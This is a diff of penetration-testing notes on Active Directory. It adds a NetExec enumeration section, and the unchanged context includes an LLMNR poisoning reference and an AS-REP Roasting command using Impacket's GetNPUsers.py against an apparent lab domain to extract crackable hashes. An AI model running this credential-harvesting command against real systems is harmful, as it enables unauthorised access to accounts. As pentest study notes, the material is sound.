@@ -114,6 +114,12 @@ Reference: [LLMNR/mDNS/NBT-NS Poisoning](https://github.com/Aghalarovf/Penetrati
 
 ---
 
+## 16. Enumeration with NXC
+
+Reference: [NetExec](https://github.com/Aghalarovf/Penetration-Tester/edit/main/Technical_Notes/Active_Directory/AD-Tools/Netexec.md)
+
+---
+
 ## 16. AS-REP Roasting
 ```powershell
 python3 /home/sako/Tools/Impacket/examples/GetNPUsers.py cicada.vl/ -usersfile valid_users -format hashcat -outputfile hashes.txt
